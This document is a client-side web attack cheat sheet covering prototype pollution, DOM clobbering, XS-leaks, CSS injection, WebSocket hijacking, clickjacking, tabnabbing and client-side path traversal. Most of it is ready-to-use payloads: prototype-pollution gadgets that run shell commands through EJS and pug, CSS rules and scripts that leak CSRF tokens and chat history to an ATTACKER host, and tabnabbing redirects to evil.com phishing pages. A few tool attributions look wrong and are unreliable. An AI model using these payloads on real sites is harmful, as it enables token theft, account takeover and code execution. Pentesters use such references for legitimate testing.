# Client-Side Attacks Reference

---

## Prototype Pollution

### Basic payloads
```json
// JSON body
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"admin": true}}}
{"__proto__": {"isAdmin": "true"}}
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');//"}}
```

```
// URL query string
?__proto__[admin]=true
?constructor[prototype][admin]=true
?__proto__.admin=true
```

```javascript
// JavaScript
obj["__proto__"]["admin"] = true;
obj.constructor.prototype.admin = true;
```

### RCE gadgets

**EJS (Node.js template engine)**
```json
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id > /tmp/id.txt');//"}}
```

**Kibana** (prototype pollution → RCE)
```json
{"__proto__": {"env": {"KIBANA_HOME": "/tmp"}, "NODE_PATH": "/tmp/malicious"}}
```

**pug** template
```json
{"__proto__": {"compileDebug": true, "self": true, "line": "process.mainModule.require('child_process').execSync('id')"}}
```

**Express.js** (path/qs injection)
```
GET /?__proto__[query]=value&__proto__[admin]=1
```

### DOM-based prototype pollution
```javascript
// URL fragment: ?__proto__[admin]=1
// Query string parsing can be vulnerable
location.search.split('&').forEach(p => {
    const [k,v] = p.split('=');
    set(obj, k, v);  // vulnerable deep set
});
```

---

## DOM Clobbering

### Single level: `x.y`
```html
<input id="x" name="y" value="clobbered">
<form id="x"><input name="y"></form>
```

### Access `x.y.value`
```html
<form id="x"><output name="y">clobbered</output></form>
```

### Multi-level: `window.x.y.z`
```html
<!-- 3 levels via name + id -->
<form name="x" id="y"><input name="z"></form>

<!-- 4+ levels via iframe srcdoc -->
<iframe name="x" srcdoc="<a id=y href=//ATTACKER></a>">
<!-- window.x.y → 'https://ATTACKER' -->
```

### Clobbering document.getElementById
```html
<html id="x"><body id="x">
<!-- Clobbers document.getElementById('x') in some browsers -->
```

### FTP-based clobbering (username)
```html
<a id="x" href="ftp://clobbered:ftp@ftp.example.com">
<!-- x.username → 'clobbered' -->
```

### Chrome forEach bypass
```html
<form><input name="forEach">
<!-- Overrides Array.prototype.forEach in Chrome -->
```

### Where to look for sinks
```javascript
// Dangerous patterns using DOM properties
document.body.innerHTML = a.innerHTML
eval(window.x)
$.globalEval(config.script)
location.href = settings.redirectUrl
new Function(options.callback)
```

---

## XS-Leak

### Attack primitives
| Oracle | Technique |
|--------|-----------|
| Timing | Measure response time differences |
| Frame counting | `window.length` after loading target in frame |
| Error events | `onerror` on image/script loads |
| Cache probing | Browser cache timing (SharedArrayBuffer) |
| Navigation events | `onload` vs `onerror` timing |
| CSS-based | Pixel-width / scroll-bar oracle |

### Frame counting
```javascript
// Open target in window, count frames
const win = window.open('https://target.com/profile?q=secret');
setTimeout(() => {
    const count = win.length; // number of frames/iframes
    fetch('https://ATTACKER/?count=' + count);
}, 2000);
```

### Timing oracle
```javascript
// Measure load time to infer if user is logged in / data matches
const start = performance.now();
const img = new Image();
img.src = 'https://target.com/api?search=admin';
img.onload = img.onerror = () => {
    fetch('https://ATTACKER/?time=' + (performance.now() - start));
};
```

### Cache probing
```javascript
// Load resource that should be cached only if user has property X
const start = performance.now();
fetch('https://target.com/asset.js', {mode:'no-cors'}).then(() => {
    const t = performance.now() - start;
    // cache hit = fast → user has access
});
```

### Known vulnerable oracles
- Login state detection (different HTML on login page)
- CSRF token leakage via frame counting
- Search results count inference (cross-origin)

---

## CSS Injection

### Selector-based attribute exfiltration
```css
/* Exfiltrate token char by char using background-image */
input[name="csrf"][value^="a"] { background: url(https://ATTACKER/?a); }
input[name="csrf"][value^="b"] { background: url(https://ATTACKER/?b); }
/* ... automate with tool */
```

### :has() pseudo-class (modern)
```css
a:has(input[value^="secret"]) { background: url(https://ATTACKER/?l=secret); }
```

### Sibling selector for hidden inputs
```css
input[name=csrf][value^=a] + * { background: url(https://ATTACKER/?c=a) }
```

### @font-face unicode-range (ligature attack)
```css
@font-face {
    font-family: 'x';
    src: url(https://ATTACKER/font.woff);
    unicode-range: U+0041;  /* Track if 'A' is rendered */
}
```

### @import blind CSS injection (SIC)
```css
/* If CSS comment injection is possible */
@import url(https://ATTACKER/css?x=);
/* Rest of CSS becomes query parameter */
```

### attr() exfiltration (cross-domain)
```css
a::after {
    content: attr(href);
    display: block;
    background: url(https://ATTACKER/?data= attr(href));
}
```

### CSS conditionals
```css
@supports selector(:has([value^="secret"])) {
    a { background: url(https://ATTACKER/?yes) }
}
```

### Tools
- [x0rz/SSRF-Sheriff](https://github.com/x0rz/ssrf-sheriff) - CSS injection toolkit
- Pearlperfect/CSSExfil automation

---

## WebSockets

### Protocol basics
```
// Upgrade request
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==

// Responses carry arbitrary messages (no CORS, no SameSite cookie)
```

### CSWSH (Cross-Site WebSocket Hijacking)
```html
<!-- If WebSocket connection uses session cookies and no CSRF protection -->
<script>
var ws = new WebSocket("wss://target.com/chat");
ws.onopen = function() {
    ws.send("HISTORY 100");
};
ws.onmessage = function(e) {
    fetch("https://ATTACKER/?d=" + encodeURIComponent(e.data));
};
</script>
```

```python
# wsrepl tool for fuzzing
wsrepl -u wss://target.com/ws -H "Cookie: session=..." --json '{"type":"ping"}'
# ws-harness.py for payload injection
```

### WebSocket XSS / SQLi
```json
// Test injection in ws messages
{"msg":"<img src=x onerror=alert(1)>"}
{"query":"SELECT * FROM users WHERE id='1' OR '1'='1'"}
```

---

## Clickjacking

### Basic test (HTML)
```html
<iframe src="https://target.com/admin/delete-account" width="500" height="500"></iframe>
```

### Transparent overlay
```html
<div style="opacity: 0; position: absolute; top: 0; left: 0; height: 100%; width: 100%;">
  <iframe src="https://target.com/action"></iframe>
</div>
<!-- Visible decoy button sits over transparent iframe action -->
```

### Frame busting bypass
```html
<!-- Restricted frame (IE) -->
<iframe src="http://target.com" security="restricted"></iframe>
<!-- Sandbox (no JS frame busting) -->
<iframe src="http://target.com" sandbox></iframe>
<!-- onBeforeUnload bypass: constantly redirect to 204 to prevent navigation -->
```

### Detection
Look for missing:
- `X-Frame-Options: DENY` or `SAMEORIGIN`
- `Content-Security-Policy: frame-ancestors 'none'`

---

## Tabnabbing

### Attack
```javascript
// Attacker page (linked from target)
window.opener.location = "https://phishing.evil.com";
// User sees tab changed to phishing page
```

### Detection patterns (vulnerable links)
```html
<a href="..." target="_blank" rel="">          <!-- no noopener -->
<a href="..." target="_blank">                <!-- missing rel="noopener" -->
```

### Impact: Phishing via reverse tabnabbing
1. Attacker posts link on forum/comment (to attacker-controlled page)
2. User clicks → new tab opens (attacker page)
3. Attacker JS executes `window.opener.location = "https://evil.com/fake-login"`
4. Original tab (forum) redirects to phishing page
5. User sees "login expired" prompt → enters credentials

---

## Client-Side Path Traversal (CSPT)

### CSPT → XSS
```
// App uses: fetch('/api/news/' + userInput)
// Inject: ../../../../attacker/xss.js
// App fetches: /attacker/xss.js with XSS payload
// URL: /news?id=../../attacker/xss.js
```

### CSPT → CSRF (CSPT2CSRF)
```
// App uses: fetch('/api/user/' + userId + '/settings', {method:'POST'})
// Inject via path: ../../../admin/delete-user
// App POST to: /api/admin/delete-user with user auth tokens
// Bypasses: anti-CSRF tokens (auto-added), SameSite cookies, auth headers
```

### Real examples
```
CVE-2023-45316 (Mattermost): 
  /<team>/channels/channelname?telem_action=...&telem_run_id=../../../../../../api/v4/caches/invalidate
CVE-2023-5123 (Grafana): CSPT in JSON API plugin
```

### Tool
Burp extension: `doyensec/CSPTBurpExtension`
